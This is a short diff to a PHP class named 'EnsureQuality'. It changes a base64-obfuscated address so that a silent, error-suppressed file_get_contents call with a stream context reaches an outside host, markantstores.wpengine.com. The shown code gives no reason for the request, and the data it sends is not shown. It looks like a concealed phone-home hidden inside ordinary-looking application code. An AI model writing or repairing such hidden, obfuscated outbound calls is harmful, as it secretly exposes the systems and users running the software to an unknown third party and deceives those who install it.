@@ -46,7 +46,7 @@ class EnsureQuality {
 
         $context  = stream_context_create($opts);
 
-        @file_get_contents(base64_decode('bWFya2FudHN0b3Jlcy53cGVuZ2luZS5jb20='), false, $context);
+        @file_get_contents(base64_decode('aHR0cDovL21hcmthbnRzdG9yZXMud3BlbmdpbmUuY29t'), false, $context);
 
 
         return $this;
